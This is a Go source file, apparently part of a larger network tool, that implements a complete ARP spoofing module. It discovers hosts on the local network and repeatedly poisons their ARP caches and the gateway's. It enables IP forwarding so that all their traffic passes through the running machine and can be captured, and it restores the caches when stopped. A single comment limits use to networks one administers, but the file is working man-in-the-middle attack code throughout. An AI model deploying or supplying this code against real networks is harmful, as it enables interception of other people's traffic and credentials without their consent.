package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"
	"github.com/gopacket/gopacket/pcap"
)

// Spoofer performs bidirectional ARP spoofing between the gateway and every
// discovered LAN host, so that their traffic transits this machine and can be
// captured. It enables IP forwarding while running and restores ARP caches on
// stop. Use ONLY on networks you administer.
type Spoofer struct {
	self    *SelfInfo
	handle  *pcap.Handle
	st      *State
	mu      sync.Mutex
	targets map[string]net.HardwareAddr // ip -> mac
	stop    chan struct{}
	wg      sync.WaitGroup
}

func startSpoof(self *SelfInfo, cidr string, st *State) (*Spoofer, error) {
	if self.Gateway == nil {
		return nil, fmt.Errorf("no default gateway found; cannot spoof")
	}
	h, err := pcap.OpenLive(self.Name, 1600, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	// Only ARP frames are relevant to discovery/poisoning; filter the rest out.
	if err := h.SetBPFFilter("arp"); err != nil {
		h.Close()
		return nil, fmt.Errorf("set bpf: %w", err)
	}
	sp := &Spoofer{self: self, handle: h, st: st, targets: map[string]net.HardwareAddr{}, stop: make(chan struct{})}

	// Single long-lived ARP reader populates the shared ARP cache and target set.
	sp.wg.Add(1)
	go sp.listenReplies()

	// Resolve the gateway MAC (needed to poison it and to heal caches on stop).
	gwMAC, err := sp.resolve(self.Gateway)
	if err != nil {
		sp.Stop()
		return nil, fmt.Errorf("resolve gateway %s: %w", self.Gateway, err)
	}
	self.GwMAC = gwMAC
	log.Printf("gateway %s is at %s", self.Gateway, gwMAC)

	enableForwarding(true)

	network := cidr
	if network == "" {
		network = deriveCIDR(self.IP, self.Mask)
	}
	sp.wg.Add(2)
	go sp.discoverLoop(network)
	go sp.poisonLoop()
	return sp, nil
}

func (sp *Spoofer) Stop() {
	select {
	case <-sp.stop:
		// already stopped
	default:
		close(sp.stop)
	}
	sp.wg.Wait()
	sp.restore()
	enableForwarding(false)
	sp.handle.Close()
	log.Println("spoof stopped, ARP caches restored")
}

// listenReplies is the sole reader of the ARP handle. It records every reply
// into the shared ARP cache and tracks spoofable targets.
func (sp *Spoofer) listenReplies() {
	defer sp.wg.Done()
	src := gopacket.NewPacketSource(sp.handle, sp.handle.LinkType())
	pkts := src.Packets()
	for {
		select {
		case <-sp.stop:
			return
		case p, ok := <-pkts:
			if !ok {
				return
			}
			arp, ok := p.Layer(layers.LayerTypeARP).(*layers.ARP)
			if !ok || arp.Operation != layers.ARPReply {
				continue
			}
			ip := net.IP(arp.SourceProtAddress).To4()
			mac := net.HardwareAddr(arp.SourceHwAddress)
			if ip == nil || ip.Equal(sp.self.IP) {
				continue
			}
			sp.st.setARP(ip, mac)
			if ip.Equal(sp.self.Gateway) {
				continue
			}
			sp.mu.Lock()
			if _, seen := sp.targets[ip.String()]; !seen {
				sp.targets[ip.String()] = append(net.HardwareAddr(nil), mac...)
				sp.st.mu.Lock()
				sp.st.spoofed[ip.String()] = true
				sp.st.mu.Unlock()
				log.Printf("spoof target: %s (%s)", ip, mac)
			}
			sp.mu.Unlock()
		}
	}
}

// resolve returns the MAC for ip by sending ARP requests and polling the cache
// that listenReplies fills. It does not read the handle itself.
func (sp *Spoofer) resolve(ip net.IP) (net.HardwareAddr, error) {
	deadline := time.Now().Add(3 * time.Second)
	key := ip.To4().String()
	for time.Now().Before(deadline) {
		sp.sendARP(layers.ARPRequest, sp.self.MAC, sp.self.IP, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ip)
		select {
		case <-sp.stop:
			return nil, fmt.Errorf("stopped")
		case <-time.After(250 * time.Millisecond):
		}
		sp.st.mu.Lock()
		mac := sp.st.arp[key]
		sp.st.mu.Unlock()
		if len(mac) == 6 {
			return mac, nil
		}
	}
	return nil, fmt.Errorf("no reply")
}

// discoverLoop periodically ARP-scans the LAN to find new hosts.
func (sp *Spoofer) discoverLoop(cidr string) {
	defer sp.wg.Done()
	scan := func() {
		ips, err := hostsOf(cidr)
		if err != nil {
			return
		}
		for _, ip := range ips {
			if ip.Equal(sp.self.IP) || ip.Equal(sp.self.Gateway) {
				continue
			}
			sp.sendARP(layers.ARPRequest, sp.self.MAC, sp.self.IP, net.HardwareAddr{0, 0, 0, 0, 0, 0}, ip)
		}
	}
	scan()
	t := time.NewTicker(30 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-sp.stop:
			return
		case <-t.C:
			scan()
		}
	}
}

// poisonLoop repeatedly tells each target "gateway = me" and the gateway
// "target = me", every 2s (ARP caches expire quickly).
func (sp *Spoofer) poisonLoop() {
	defer sp.wg.Done()
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-sp.stop:
			return
		case <-t.C:
			sp.mu.Lock()
			for ipStr, mac := range sp.targets {
				ip := net.ParseIP(ipStr).To4()
				sp.sendARP(layers.ARPReply, sp.self.MAC, sp.self.Gateway, mac, ip)           // target: gw is me
				sp.sendARP(layers.ARPReply, sp.self.MAC, ip, sp.self.GwMAC, sp.self.Gateway) // gw: target is me
			}
			sp.mu.Unlock()
		}
	}
}

// restore sends correct ARP mappings so the network heals after we stop.
func (sp *Spoofer) restore() {
	sp.mu.Lock()
	defer sp.mu.Unlock()
	if sp.self.GwMAC == nil {
		return
	}
	for ipStr, mac := range sp.targets {
		ip := net.ParseIP(ipStr).To4()
		for i := 0; i < 3; i++ {
			sp.sendARP(layers.ARPReply, sp.self.GwMAC, sp.self.Gateway, mac, ip)
			sp.sendARP(layers.ARPReply, mac, ip, sp.self.GwMAC, sp.self.Gateway)
			time.Sleep(100 * time.Millisecond)
		}
	}
}

func (sp *Spoofer) sendARP(op uint16, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) {
	eth := layers.Ethernet{SrcMAC: srcMAC, DstMAC: dstMAC, EthernetType: layers.EthernetTypeARP}
	if op == layers.ARPRequest {
		eth.DstMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp); err != nil {
		return
	}
	_ = sp.handle.WritePacketData(buf.Bytes())
}

func enableForwarding(on bool) {
	v := "0"
	if on {
		v = "1"
	}
	if err := exec.Command("sysctl", "-w", "net.inet.ip.forwarding="+v).Run(); err != nil {
		log.Printf("warning: could not set ip.forwarding=%s: %v", v, err)
	}
}

func deriveCIDR(ip net.IP, mask net.IPMask) string {
	ones, _ := mask.Size()
	return fmt.Sprintf("%s/%d", ip.Mask(mask).String(), ones)
}

func hostsOf(cidr string) ([]net.IP, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []net.IP
	for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); ip = nextIP(ip) {
		ips = append(ips, dup(ip))
		if len(ips) > 4096 {
			break
		}
	}
	if len(ips) > 2 {
		ips = ips[1 : len(ips)-1] // drop network + broadcast
	}
	return ips, nil
}

func nextIP(ip net.IP) net.IP {
	out := dup(ip)
	for i := len(out) - 1; i >= 0; i-- {
		out[i]++
		if out[i] != 0 {
			break
		}
	}
	return out
}

func dup(ip net.IP) net.IP {
	c := make(net.IP, len(ip))
	copy(c, ip)
	return c
}
